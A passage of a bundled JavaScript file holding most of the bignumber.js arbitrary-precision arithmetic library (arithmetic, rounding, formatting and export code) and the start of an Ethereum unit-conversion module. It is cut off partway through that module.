                                    x = x.mod(m); //x = x.minus(div(x, m, 0, MODULO_MODE).times(m));
                                }
                            }

                            if (isModExp) return y;
                            if (nIsNeg) y = ONE.div(y);

                            return m ? y.mod(m) : k ? round(y, POW_PRECISION, ROUNDING_MODE, more) : y;
                        };


                        /*
                         * Return a new BigNumber whose value is the value of this BigNumber rounded to an integer
                         * using rounding mode rm, or ROUNDING_MODE if rm is omitted.
                         *
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {rm}'
                         */
                        P.integerValue = function(rm) {
                            var n = new BigNumber(this);
                            if (rm == null) rm = ROUNDING_MODE;
                            else intCheck(rm, 0, 8);
                            return round(n, n.e + 1, rm);
                        };


                        /*
                         * Return true if the value of this BigNumber is equal to the value of BigNumber(y, b),
                         * otherwise return false.
                         */
                        P.isEqualTo = P.eq = function(y, b) {
                            return compare(this, new BigNumber(y, b)) === 0;
                        };


                        /*
                         * Return true if the value of this BigNumber is a finite number, otherwise return false.
                         */
                        P.isFinite = function() {
                            return !!this.c;
                        };


                        /*
                         * Return true if the value of this BigNumber is greater than the value of BigNumber(y, b),
                         * otherwise return false.
                         */
                        P.isGreaterThan = P.gt = function(y, b) {
                            return compare(this, new BigNumber(y, b)) > 0;
                        };


                        /*
                         * Return true if the value of this BigNumber is greater than or equal to the value of
                         * BigNumber(y, b), otherwise return false.
                         */
                        P.isGreaterThanOrEqualTo = P.gte = function(y, b) {
                            return (b = compare(this, new BigNumber(y, b))) === 1 || b === 0;

                        };


                        /*
                         * Return true if the value of this BigNumber is an integer, otherwise return false.
                         */
                        P.isInteger = function() {
                            return !!this.c && bitFloor(this.e / LOG_BASE) > this.c.length - 2;
                        };


                        /*
                         * Return true if the value of this BigNumber is less than the value of BigNumber(y, b),
                         * otherwise return false.
                         */
                        P.isLessThan = P.lt = function(y, b) {
                            return compare(this, new BigNumber(y, b)) < 0;
                        };


                        /*
                         * Return true if the value of this BigNumber is less than or equal to the value of
                         * BigNumber(y, b), otherwise return false.
                         */
                        P.isLessThanOrEqualTo = P.lte = function(y, b) {
                            return (b = compare(this, new BigNumber(y, b))) === -1 || b === 0;
                        };


                        /*
                         * Return true if the value of this BigNumber is NaN, otherwise return false.
                         */
                        P.isNaN = function() {
                            return !this.s;
                        };


                        /*
                         * Return true if the value of this BigNumber is negative, otherwise return false.
                         */
                        P.isNegative = function() {
                            return this.s < 0;
                        };


                        /*
                         * Return true if the value of this BigNumber is positive, otherwise return false.
                         */
                        P.isPositive = function() {
                            return this.s > 0;
                        };


                        /*
                         * Return true if the value of this BigNumber is 0 or -0, otherwise return false.
                         */
                        P.isZero = function() {
                            return !!this.c && this.c[0] == 0;
                        };


                        /*
                         *  n - 0 = n
                         *  n - N = N
                         *  n - I = -I
                         *  0 - n = -n
                         *  0 - 0 = 0
                         *  0 - N = N
                         *  0 - I = -I
                         *  N - n = N
                         *  N - 0 = N
                         *  N - N = N
                         *  N - I = N
                         *  I - n = I
                         *  I - 0 = I
                         *  I - N = N
                         *  I - I = N
                         *
                         * Return a new BigNumber whose value is the value of this BigNumber minus the value of
                         * BigNumber(y, b).
                         */
                        P.minus = function(y, b) {
                            var i, j, t, xLTy,
                                x = this,
                                a = x.s;

                            y = new BigNumber(y, b);
                            b = y.s;

                            // Either NaN?
                            if (!a || !b) return new BigNumber(NaN);

                            // Signs differ?
                            if (a != b) {
                                y.s = -b;
                                return x.plus(y);
                            }

                            var xe = x.e / LOG_BASE,
                                ye = y.e / LOG_BASE,
                                xc = x.c,
                                yc = y.c;

                            if (!xe || !ye) {

                                // Either Infinity?
                                if (!xc || !yc) return xc ? (y.s = -b, y) : new BigNumber(yc ? x : NaN);

                                // Either zero?
                                if (!xc[0] || !yc[0]) {

                                    // Return y if y is non-zero, x if x is non-zero, or zero if both are zero.
                                    return yc[0] ? (y.s = -b, y) : new BigNumber(xc[0] ? x :

                                        // IEEE 754 (2008) 6.3: n - n = -0 when rounding to -Infinity
                                        ROUNDING_MODE == 3 ? -0 : 0);
                                }
                            }

                            xe = bitFloor(xe);
                            ye = bitFloor(ye);
                            xc = xc.slice();

                            // Determine which is the bigger number.
                            if (a = xe - ye) {

                                if (xLTy = a < 0) {
                                    a = -a;
                                    t = xc;
                                } else {
                                    ye = xe;
                                    t = yc;
                                }

                                t.reverse();

                                // Prepend zeros to equalise exponents.
                                for (b = a; b--; t.push(0));
                                t.reverse();
                            } else {

                                // Exponents equal. Check digit by digit.
                                j = (xLTy = (a = xc.length) < (b = yc.length)) ? a : b;

                                for (a = b = 0; b < j; b++) {

                                    if (xc[b] != yc[b]) {
                                        xLTy = xc[b] < yc[b];
                                        break;
                                    }
                                }
                            }

                            // x < y? Point xc to the array of the bigger number.
                            if (xLTy) t = xc, xc = yc, yc = t, y.s = -y.s;

                            b = (j = yc.length) - (i = xc.length);

                            // Append zeros to xc if shorter.
                            // No need to add zeros to yc if shorter as subtract only needs to start at yc.length.
                            if (b > 0)
                                for (; b--; xc[i++] = 0);
                            b = BASE - 1;

                            // Subtract yc from xc.
                            for (; j > a;) {

                                if (xc[--j] < yc[j]) {
                                    for (i = j; i && !xc[--i]; xc[i] = b);
                                    --xc[i];
                                    xc[j] += BASE;
                                }

                                xc[j] -= yc[j];
                            }

                            // Remove leading zeros and adjust exponent accordingly.
                            for (; xc[0] == 0; xc.splice(0, 1), --ye);

                            // Zero?
                            if (!xc[0]) {

                                // Following IEEE 754 (2008) 6.3,
                                // n - n = +0  but  n - n = -0  when rounding towards -Infinity.
                                y.s = ROUNDING_MODE == 3 ? -1 : 1;
                                y.c = [y.e = 0];
                                return y;
                            }

                            // No need to check for Infinity as +x - +y != Infinity && -x - -y != Infinity
                            // for finite x and y.
                            return normalise(y, xc, ye);
                        };


                        /*
                         *   n % 0 =  N
                         *   n % N =  N
                         *   n % I =  n
                         *   0 % n =  0
                         *  -0 % n = -0
                         *   0 % 0 =  N
                         *   0 % N =  N
                         *   0 % I =  0
                         *   N % n =  N
                         *   N % 0 =  N
                         *   N % N =  N
                         *   N % I =  N
                         *   I % n =  N
                         *   I % 0 =  N
                         *   I % N =  N
                         *   I % I =  N
                         *
                         * Return a new BigNumber whose value is the value of this BigNumber modulo the value of
                         * BigNumber(y, b). The result depends on the value of MODULO_MODE.
                         */
                        P.modulo = P.mod = function(y, b) {
                            var q, s,
                                x = this;

                            y = new BigNumber(y, b);

                            // Return NaN if x is Infinity or NaN, or y is NaN or zero.
                            if (!x.c || !y.s || y.c && !y.c[0]) {
                                return new BigNumber(NaN);

                                // Return x if y is Infinity or x is zero.
                            } else if (!y.c || x.c && !x.c[0]) {
                                return new BigNumber(x);
                            }

                            if (MODULO_MODE == 9) {

                                // Euclidian division: q = sign(y) * floor(x / abs(y))
                                // r = x - qy    where  0 <= r < abs(y)
                                s = y.s;
                                y.s = 1;
                                q = div(x, y, 0, 3);
                                y.s = s;
                                q.s *= s;
                            } else {
                                q = div(x, y, 0, MODULO_MODE);
                            }

                            y = x.minus(q.times(y));

                            // To match JavaScript %, ensure sign of zero is sign of dividend.
                            if (!y.c[0] && MODULO_MODE == 1) y.s = x.s;

                            return y;
                        };


                        /*
                         *  n * 0 = 0
                         *  n * N = N
                         *  n * I = I
                         *  0 * n = 0
                         *  0 * 0 = 0
                         *  0 * N = N
                         *  0 * I = N
                         *  N * n = N
                         *  N * 0 = N
                         *  N * N = N
                         *  N * I = N
                         *  I * n = I
                         *  I * 0 = N
                         *  I * N = N
                         *  I * I = I
                         *
                         * Return a new BigNumber whose value is the value of this BigNumber multiplied by the value
                         * of BigNumber(y, b).
                         */
                        P.multipliedBy = P.times = function(y, b) {
                            var c, e, i, j, k, m, xcL, xlo, xhi, ycL, ylo, yhi, zc,
                                base, sqrtBase,
                                x = this,
                                xc = x.c,
                                yc = (y = new BigNumber(y, b)).c;

                            // Either NaN, ±Infinity or ±0?
                            if (!xc || !yc || !xc[0] || !yc[0]) {

                                // Return NaN if either is NaN, or one is 0 and the other is Infinity.
                                if (!x.s || !y.s || xc && !xc[0] && !yc || yc && !yc[0] && !xc) {
                                    y.c = y.e = y.s = null;
                                } else {
                                    y.s *= x.s;

                                    // Return ±Infinity if either is ±Infinity.
                                    if (!xc || !yc) {
                                        y.c = y.e = null;

                                        // Return ±0 if either is ±0.
                                    } else {
                                        y.c = [0];
                                        y.e = 0;
                                    }
                                }

                                return y;
                            }

                            e = bitFloor(x.e / LOG_BASE) + bitFloor(y.e / LOG_BASE);
                            y.s *= x.s;
                            xcL = xc.length;
                            ycL = yc.length;

                            // Ensure xc points to longer array and xcL to its length.
                            if (xcL < ycL) zc = xc, xc = yc, yc = zc, i = xcL, xcL = ycL, ycL = i;

                            // Initialise the result array with zeros.
                            for (i = xcL + ycL, zc = []; i--; zc.push(0));

                            base = BASE;
                            sqrtBase = SQRT_BASE;

                            for (i = ycL; --i >= 0;) {
                                c = 0;
                                ylo = yc[i] % sqrtBase;
                                yhi = yc[i] / sqrtBase | 0;

                                for (k = xcL, j = i + k; j > i;) {
                                    xlo = xc[--k] % sqrtBase;
                                    xhi = xc[k] / sqrtBase | 0;
                                    m = yhi * xlo + xhi * ylo;
                                    xlo = ylo * xlo + ((m % sqrtBase) * sqrtBase) + zc[j] + c;
                                    c = (xlo / base | 0) + (m / sqrtBase | 0) + yhi * xhi;
                                    zc[j--] = xlo % base;
                                }

                                zc[j] = c;
                            }

                            if (c) {
                                ++e;
                            } else {
                                zc.splice(0, 1);
                            }

                            return normalise(y, zc, e);
                        };


                        /*
                         * Return a new BigNumber whose value is the value of this BigNumber negated,
                         * i.e. multiplied by -1.
                         */
                        P.negated = function() {
                            var x = new BigNumber(this);
                            x.s = -x.s || null;
                            return x;
                        };


                        /*
                         *  n + 0 = n
                         *  n + N = N
                         *  n + I = I
                         *  0 + n = n
                         *  0 + 0 = 0
                         *  0 + N = N
                         *  0 + I = I
                         *  N + n = N
                         *  N + 0 = N
                         *  N + N = N
                         *  N + I = N
                         *  I + n = I
                         *  I + 0 = I
                         *  I + N = N
                         *  I + I = I
                         *
                         * Return a new BigNumber whose value is the value of this BigNumber plus the value of
                         * BigNumber(y, b).
                         */
                        P.plus = function(y, b) {
                            var t,
                                x = this,
                                a = x.s;

                            y = new BigNumber(y, b);
                            b = y.s;

                            // Either NaN?
                            if (!a || !b) return new BigNumber(NaN);

                            // Signs differ?
                            if (a != b) {
                                y.s = -b;
                                return x.minus(y);
                            }

                            var xe = x.e / LOG_BASE,
                                ye = y.e / LOG_BASE,
                                xc = x.c,
                                yc = y.c;

                            if (!xe || !ye) {

                                // Return ±Infinity if either ±Infinity.
                                if (!xc || !yc) return new BigNumber(a / 0);

                                // Either zero?
                                // Return y if y is non-zero, x if x is non-zero, or zero if both are zero.
                                if (!xc[0] || !yc[0]) return yc[0] ? y : new BigNumber(xc[0] ? x : a * 0);
                            }

                            xe = bitFloor(xe);
                            ye = bitFloor(ye);
                            xc = xc.slice();

                            // Prepend zeros to equalise exponents. Faster to use reverse then do unshifts.
                            if (a = xe - ye) {
                                if (a > 0) {
                                    ye = xe;
                                    t = yc;
                                } else {
                                    a = -a;
                                    t = xc;
                                }

                                t.reverse();
                                for (; a--; t.push(0));
                                t.reverse();
                            }

                            a = xc.length;
                            b = yc.length;

                            // Point xc to the longer array, and b to the shorter length.
                            if (a - b < 0) t = yc, yc = xc, xc = t, b = a;

                            // Only start adding at yc.length - 1 as the further digits of xc can be ignored.
                            for (a = 0; b;) {
                                a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0;
                                xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE;
                            }

                            if (a) {
                                xc = [a].concat(xc);
                                ++ye;
                            }

                            // No need to check for zero, as +x + +y != 0 && -x + -y != 0
                            // ye = MAX_EXP + 1 possible
                            return normalise(y, xc, ye);
                        };


                        /*
                         * If sd is undefined or null or true or false, return the number of significant digits of
                         * the value of this BigNumber, or null if the value of this BigNumber is ±Infinity or NaN.
                         * If sd is true include integer-part trailing zeros in the count.
                         *
                         * Otherwise, if sd is a number, return a new BigNumber whose value is the value of this
                         * BigNumber rounded to a maximum of sd significant digits using rounding mode rm, or
                         * ROUNDING_MODE if rm is omitted.
                         *
                         * sd {number|boolean} number: significant digits: integer, 1 to MAX inclusive.
                         *                     boolean: whether to count integer-part trailing zeros: true or false.
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {sd|rm}'
                         */
                        P.precision = P.sd = function(sd, rm) {
                            var c, n, v,
                                x = this;

                            if (sd != null && sd !== !!sd) {
                                intCheck(sd, 1, MAX);
                                if (rm == null) rm = ROUNDING_MODE;
                                else intCheck(rm, 0, 8);

                                return round(new BigNumber(x), sd, rm);
                            }

                            if (!(c = x.c)) return null;
                            v = c.length - 1;
                            n = v * LOG_BASE + 1;

                            if (v = c[v]) {

                                // Subtract the number of trailing zeros of the last element.
                                for (; v % 10 == 0; v /= 10, n--);

                                // Add the number of digits of the first element.
                                for (v = c[0]; v >= 10; v /= 10, n++);
                            }

                            if (sd && x.e + 1 > n) n = x.e + 1;

                            return n;
                        };


                        /*
                         * Return a new BigNumber whose value is the value of this BigNumber shifted by k places
                         * (powers of 10). Shift to the right if n > 0, and to the left if n < 0.
                         *
                         * k {number} Integer, -MAX_SAFE_INTEGER to MAX_SAFE_INTEGER inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {k}'
                         */
                        P.shiftedBy = function(k) {
                            intCheck(k, -MAX_SAFE_INTEGER, MAX_SAFE_INTEGER);
                            return this.times('1e' + k);
                        };


                        /*
                         *  sqrt(-n) =  N
                         *  sqrt(N) =  N
                         *  sqrt(-I) =  N
                         *  sqrt(I) =  I
                         *  sqrt(0) =  0
                         *  sqrt(-0) = -0
                         *
                         * Return a new BigNumber whose value is the square root of the value of this BigNumber,
                         * rounded according to DECIMAL_PLACES and ROUNDING_MODE.
                         */
                        P.squareRoot = P.sqrt = function() {
                            var m, n, r, rep, t,
                                x = this,
                                c = x.c,
                                s = x.s,
                                e = x.e,
                                dp = DECIMAL_PLACES + 4,
                                half = new BigNumber('0.5');

                            // Negative/NaN/Infinity/zero?
                            if (s !== 1 || !c || !c[0]) {
                                return new BigNumber(!s || s < 0 && (!c || c[0]) ? NaN : c ? x : 1 / 0);
                            }

                            // Initial estimate.
                            s = Math.sqrt(+valueOf(x));

                            // Math.sqrt underflow/overflow?
                            // Pass x to Math.sqrt as integer, then adjust the exponent of the result.
                            if (s == 0 || s == 1 / 0) {
                                n = coeffToString(c);
                                if ((n.length + e) % 2 == 0) n += '0';
                                s = Math.sqrt(+n);
                                e = bitFloor((e + 1) / 2) - (e < 0 || e % 2);

                                if (s == 1 / 0) {
                                    n = '1e' + e;
                                } else {
                                    n = s.toExponential();
                                    n = n.slice(0, n.indexOf('e') + 1) + e;
                                }

                                r = new BigNumber(n);
                            } else {
                                r = new BigNumber(s + '');
                            }

                            // Check for zero.
                            // r could be zero if MIN_EXP is changed after the this value was created.
                            // This would cause a division by zero (x/t) and hence Infinity below, which would cause
                            // coeffToString to throw.
                            if (r.c[0]) {
                                e = r.e;
                                s = e + dp;
                                if (s < 3) s = 0;

                                // Newton-Raphson iteration.
                                for (;;) {
                                    t = r;
                                    r = half.times(t.plus(div(x, t, dp, 1)));

                                    if (coeffToString(t.c).slice(0, s) === (n = coeffToString(r.c)).slice(0, s)) {

                                        // The exponent of r may here be one less than the final result exponent,
                                        // e.g 0.0009999 (e-4) --> 0.001 (e-3), so adjust s so the rounding digits
                                        // are indexed correctly.
                                        if (r.e < e) --s;
                                        n = n.slice(s - 3, s + 1);

                                        // The 4th rounding digit may be in error by -1 so if the 4 rounding digits
                                        // are 9999 or 4999 (i.e. approaching a rounding boundary) continue the
                                        // iteration.
                                        if (n == '9999' || !rep && n == '4999') {

                                            // On the first iteration only, check to see if rounding up gives the
                                            // exact result as the nines may infinitely repeat.
                                            if (!rep) {
                                                round(t, t.e + DECIMAL_PLACES + 2, 0);

                                                if (t.times(t).eq(x)) {
                                                    r = t;
                                                    break;
                                                }
                                            }

                                            dp += 4;
                                            s += 4;
                                            rep = 1;
                                        } else {

                                            // If rounding digits are null, 0{0,4} or 50{0,3}, check for exact
                                            // result. If not, then there are further digits and m will be truthy.
                                            if (!+n || !+n.slice(1) && n.charAt(0) == '5') {

                                                // Truncate to the first rounding digit.
                                                round(r, r.e + DECIMAL_PLACES + 2, 1);
                                                m = !r.times(r).eq(x);
                                            }

                                            break;
                                        }
                                    }
                                }
                            }

                            return round(r, r.e + DECIMAL_PLACES + 1, ROUNDING_MODE, m);
                        };


                        /*
                         * Return a string representing the value of this BigNumber in exponential notation and
                         * rounded using ROUNDING_MODE to dp fixed decimal places.
                         *
                         * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
                         */
                        P.toExponential = function(dp, rm) {
                            if (dp != null) {
                                intCheck(dp, 0, MAX);
                                dp++;
                            }
                            return format(this, dp, rm, 1);
                        };


                        /*
                         * Return a string representing the value of this BigNumber in fixed-point notation rounding
                         * to dp fixed decimal places using rounding mode rm, or ROUNDING_MODE if rm is omitted.
                         *
                         * Note: as with JavaScript's number type, (-0).toFixed(0) is '0',
                         * but e.g. (-0.00001).toFixed(0) is '-0'.
                         *
                         * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
                         */
                        P.toFixed = function(dp, rm) {
                            if (dp != null) {
                                intCheck(dp, 0, MAX);
                                dp = dp + this.e + 1;
                            }
                            return format(this, dp, rm);
                        };


                        /*
                         * Return a string representing the value of this BigNumber in fixed-point notation rounded
                         * using rm or ROUNDING_MODE to dp decimal places, and formatted according to the properties
                         * of the format or FORMAT object (see BigNumber.set).
                         *
                         * The formatting object may contain some or all of the properties shown below.
                         *
                         * FORMAT = {
                         *   prefix: '',
                         *   groupSize: 3,
                         *   secondaryGroupSize: 0,
                         *   groupSeparator: ',',
                         *   decimalSeparator: '.',
                         *   fractionGroupSize: 0,
                         *   fractionGroupSeparator: '\xA0',      // non-breaking space
                         *   suffix: ''
                         * };
                         *
                         * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         * [format] {object} Formatting options. See FORMAT pbject above.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
                         * '[BigNumber Error] Argument not an object: {format}'
                         */
                        P.toFormat = function(dp, rm, format) {
                            var str,
                                x = this;

                            if (format == null) {
                                if (dp != null && rm && typeof rm == 'object') {
                                    format = rm;
                                    rm = null;
                                } else if (dp && typeof dp == 'object') {
                                    format = dp;
                                    dp = rm = null;
                                } else {
                                    format = FORMAT;
                                }
                            } else if (typeof format != 'object') {
                                throw Error(bignumberError + 'Argument not an object: ' + format);
                            }

                            str = x.toFixed(dp, rm);

                            if (x.c) {
                                var i,
                                    arr = str.split('.'),
                                    g1 = +format.groupSize,
                                    g2 = +format.secondaryGroupSize,
                                    groupSeparator = format.groupSeparator || '',
                                    intPart = arr[0],
                                    fractionPart = arr[1],
                                    isNeg = x.s < 0,
                                    intDigits = isNeg ? intPart.slice(1) : intPart,
                                    len = intDigits.length;

                                if (g2) i = g1, g1 = g2, g2 = i, len -= i;

                                if (g1 > 0 && len > 0) {
                                    i = len % g1 || g1;
                                    intPart = intDigits.substr(0, i);
                                    for (; i < len; i += g1) intPart += groupSeparator + intDigits.substr(i, g1);
                                    if (g2 > 0) intPart += groupSeparator + intDigits.slice(i);
                                    if (isNeg) intPart = '-' + intPart;
                                }

                                str = fractionPart ?
                                    intPart + (format.decimalSeparator || '') + ((g2 = +format.fractionGroupSize) ?
                                        fractionPart.replace(new RegExp('\\d{' + g2 + '}\\B', 'g'),
                                            '$&' + (format.fractionGroupSeparator || '')) :
                                        fractionPart) :
                                    intPart;
                            }

                            return (format.prefix || '') + str + (format.suffix || '');
                        };


                        /*
                         * Return an array of two BigNumbers representing the value of this BigNumber as a simple
                         * fraction with an integer numerator and an integer denominator.
                         * The denominator will be a positive non-zero value less than or equal to the specified
                         * maximum denominator. If a maximum denominator is not specified, the denominator will be
                         * the lowest value necessary to represent the number exactly.
                         *
                         * [md] {number|string|BigNumber} Integer >= 1, or Infinity. The maximum denominator.
                         *
                         * '[BigNumber Error] Argument {not an integer|out of range} : {md}'
                         */
                        P.toFraction = function(md) {
                            var d, d0, d1, d2, e, exp, n, n0, n1, q, r, s,
                                x = this,
                                xc = x.c;

                            if (md != null) {
                                n = new BigNumber(md);

                                // Throw if md is less than one or is not an integer, unless it is Infinity.
                                if (!n.isInteger() && (n.c || n.s !== 1) || n.lt(ONE)) {
                                    throw Error(bignumberError + 'Argument ' +
                                        (n.isInteger() ? 'out of range: ' : 'not an integer: ') + valueOf(n));
                                }
                            }

                            if (!xc) return new BigNumber(x);

                            d = new BigNumber(ONE);
                            n1 = d0 = new BigNumber(ONE);
                            d1 = n0 = new BigNumber(ONE);
                            s = coeffToString(xc);

                            // Determine initial denominator.
                            // d is a power of 10 and the minimum max denominator that specifies the value exactly.
                            e = d.e = s.length - x.e - 1;
                            d.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp];
                            md = !md || n.comparedTo(d) > 0 ? (e > 0 ? d : n1) : n;

                            exp = MAX_EXP;
                            MAX_EXP = 1 / 0;
                            n = new BigNumber(s);

                            // n0 = d1 = 0
                            n0.c[0] = 0;

                            for (;;) {
                                q = div(n, d, 0, 1);
                                d2 = d0.plus(q.times(d1));
                                if (d2.comparedTo(md) == 1) break;
                                d0 = d1;
                                d1 = d2;
                                n1 = n0.plus(q.times(d2 = n1));
                                n0 = d2;
                                d = n.minus(q.times(d2 = d));
                                n = d2;
                            }

                            d2 = div(md.minus(d0), d1, 0, 1);
                            n0 = n0.plus(d2.times(n1));
                            d0 = d0.plus(d2.times(d1));
                            n0.s = n1.s = x.s;
                            e = e * 2;

                            // Determine which fraction is closer to x, n0/d0 or n1/d1
                            r = div(n1, d1, e, ROUNDING_MODE).minus(x).abs().comparedTo(
                                div(n0, d0, e, ROUNDING_MODE).minus(x).abs()) < 1 ? [n1, d1] : [n0, d0];

                            MAX_EXP = exp;

                            return r;
                        };


                        /*
                         * Return the value of this BigNumber converted to a number primitive.
                         */
                        P.toNumber = function() {
                            return +valueOf(this);
                        };


                        /*
                         * Return a string representing the value of this BigNumber rounded to sd significant digits
                         * using rounding mode rm or ROUNDING_MODE. If sd is less than the number of digits
                         * necessary to represent the integer part of the value in fixed-point notation, then use
                         * exponential notation.
                         *
                         * [sd] {number} Significant digits. Integer, 1 to MAX inclusive.
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {sd|rm}'
                         */
                        P.toPrecision = function(sd, rm) {
                            if (sd != null) intCheck(sd, 1, MAX);
                            return format(this, sd, rm, 2);
                        };


                        /*
                         * Return a string representing the value of this BigNumber in base b, or base 10 if b is
                         * omitted. If a base is specified, including base 10, round according to DECIMAL_PLACES and
                         * ROUNDING_MODE. If a base is not specified, and this BigNumber has a positive exponent
                         * that is equal to or greater than TO_EXP_POS, or a negative exponent equal to or less than
                         * TO_EXP_NEG, return exponential notation.
                         *
                         * [b] {number} Integer, 2 to ALPHABET.length inclusive.
                         *
                         * '[BigNumber Error] Base {not a primitive number|not an integer|out of range}: {b}'
                         */
                        P.toString = function(b) {
                            var str,
                                n = this,
                                s = n.s,
                                e = n.e;

                            // Infinity or NaN?
                            if (e === null) {
                                if (s) {
                                    str = 'Infinity';
                                    if (s < 0) str = '-' + str;
                                } else {
                                    str = 'NaN';
                                }
                            } else {
                                if (b == null) {
                                    str = e <= TO_EXP_NEG || e >= TO_EXP_POS ?
                                        toExponential(coeffToString(n.c), e) :
                                        toFixedPoint(coeffToString(n.c), e, '0');
                                } else if (b === 10) {
                                    n = round(new BigNumber(n), DECIMAL_PLACES + e + 1, ROUNDING_MODE);
                                    str = toFixedPoint(coeffToString(n.c), n.e, '0');
                                } else {
                                    intCheck(b, 2, ALPHABET.length, 'Base');
                                    str = convertBase(toFixedPoint(coeffToString(n.c), e, '0'), 10, b, s, true);
                                }

                                if (s < 0 && n.c[0]) str = '-' + str;
                            }

                            return str;
                        };


                        /*
                         * Return as toString, but do not accept a base argument, and include the minus sign for
                         * negative zero.
                         */
                        P.valueOf = P.toJSON = function() {
                            return valueOf(this);
                        };


                        P._isBigNumber = true;

                        if (hasSymbol) {
                            P[Symbol.toStringTag] = 'BigNumber';

                            // Node.js v10.12.0+
                            P[Symbol.for('nodejs.util.inspect.custom')] = P.valueOf;
                        }

                        if (configObject != null) BigNumber.set(configObject);

                        return BigNumber;
                    }


                    // PRIVATE HELPER FUNCTIONS

                    // These functions don't need access to variables,
                    // e.g. DECIMAL_PLACES, in the scope of the `clone` function above.


                    function bitFloor(n) {
                        var i = n | 0;
                        return n > 0 || n === i ? i : i - 1;
                    }


                    // Return a coefficient array as a string of base 10 digits.
                    function coeffToString(a) {
                        var s, z,
                            i = 1,
                            j = a.length,
                            r = a[0] + '';

                        for (; i < j;) {
                            s = a[i++] + '';
                            z = LOG_BASE - s.length;
                            for (; z--; s = '0' + s);
                            r += s;
                        }

                        // Determine trailing zeros.
                        for (j = r.length; r.charCodeAt(--j) === 48;);

                        return r.slice(0, j + 1 || 1);
                    }


                    // Compare the value of BigNumbers x and y.
                    function compare(x, y) {
                        var a, b,
                            xc = x.c,
                            yc = y.c,
                            i = x.s,
                            j = y.s,
                            k = x.e,
                            l = y.e;

                        // Either NaN?
                        if (!i || !j) return null;

                        a = xc && !xc[0];
                        b = yc && !yc[0];

                        // Either zero?
                        if (a || b) return a ? b ? 0 : -j : i;

                        // Signs differ?
                        if (i != j) return i;

                        a = i < 0;
                        b = k == l;

                        // Either Infinity?
                        if (!xc || !yc) return b ? 0 : !xc ^ a ? 1 : -1;

                        // Compare exponents.
                        if (!b) return k > l ^ a ? 1 : -1;

                        j = (k = xc.length) < (l = yc.length) ? k : l;

                        // Compare digit by digit.
                        for (i = 0; i < j; i++)
                            if (xc[i] != yc[i]) return xc[i] > yc[i] ^ a ? 1 : -1;

                        // Compare lengths.
                        return k == l ? 0 : k > l ^ a ? 1 : -1;
                    }


                    /*
                     * Check that n is a primitive number, an integer, and in range, otherwise throw.
                     */
                    function intCheck(n, min, max, name) {
                        if (n < min || n > max || n !== mathfloor(n)) {
                            throw Error(bignumberError + (name || 'Argument') + (typeof n == 'number' ?
                                n < min || n > max ? ' out of range: ' : ' not an integer: ' :
                                ' not a primitive number: ') + String(n));
                        }
                    }


                    // Assumes finite n.
                    function isOdd(n) {
                        var k = n.c.length - 1;
                        return bitFloor(n.e / LOG_BASE) == k && n.c[k] % 2 != 0;
                    }


                    function toExponential(str, e) {
                        return (str.length > 1 ? str.charAt(0) + '.' + str.slice(1) : str) +
                            (e < 0 ? 'e' : 'e+') + e;
                    }


                    function toFixedPoint(str, e, z) {
                        var len, zs;

                        // Negative exponent?
                        if (e < 0) {

                            // Prepend zeros.
                            for (zs = z + '.'; ++e; zs += z);
                            str = zs + str;

                            // Positive exponent
                        } else {
                            len = str.length;

                            // Append zeros.
                            if (++e > len) {
                                for (zs = z, e -= len; --e; zs += z);
                                str += zs;
                            } else if (e < len) {
                                str = str.slice(0, e) + '.' + str.slice(e);
                            }
                        }

                        return str;
                    }


                    // EXPORT


                    BigNumber = clone();
                    BigNumber['default'] = BigNumber.BigNumber = BigNumber;

                    // AMD.
                    if (typeof define == 'function' && define.amd) {
                        define(function() {
                            return BigNumber;
                        });

                        // Node.js and other environments that support module.exports.
                    } else if (typeof module != 'undefined' && module.exports) {
                        module.exports = BigNumber;

                        // Browser.
                    } else {
                        if (!globalObject) {
                            globalObject = typeof self != 'undefined' && self ? self : window;
                        }

                        globalObject.BigNumber = BigNumber;
                    }
                })(this);

            }, {}],
            3: [function(require, module, exports) {
                'use strict';

                var BN = require('bignumber.js');

                function convertToEther(value, unit) {
                    if (value == undefined) {
                        throw TypeError('value is required');
                    }

                    if (unit == undefined) {
                        throw TypeError('unit is required');
                    }

                    var v = new BN(value);
                    unit = unit.toLowerCase();
                    if (unit === 'eth') unit = 'ether';

                    if (unit === 'wei') return v.times(new BN(0.000000000000000001));
                    if (unit === 'kwei') return v.times(new BN(0.000000000000001));
                    if (unit === 'mwei') return v.times(new BN(0.000000000001));
                    if (unit === 'gwei') return v.times(new BN(0.000000001));
                    if (unit === 'szabo') return v.times(new BN(0.000001));
                    if (unit === 'finney') return v.times(new BN(0.001));
                    if (unit === 'ether') return v.times(new BN(1));
                    if (unit === 'kether') return v.times(new BN(1000));
                    if (unit === 'mether') return v.times(new BN(1000000));
                    if (unit === 'gether') return v.times(new BN(1000000000));
                    if (unit === 'tether') return v.times(new BN(1000000000000));

                    throw TypeError('Invalid unit');
                }

                function converter(value, unit, toUnit) {
                    var v = convertToEther(value, unit);
                    unit = unit.toLowerCase();
                    if (unit === 'eth') unit = 'ether';
                    if (toUnit === 'eth') toUnit = 'ether';

                    var result = {
                        wei: null,
                        kwei: null,
                        mwei: null,
                        gwei: null,
                        szabo: null,
                        finney: null,
                        ether: null,
                        kether: null,
                        mether: null,
                        gether: null,
                        tether: null
                    };

                    result[unit] = new BN(value).toString(10);

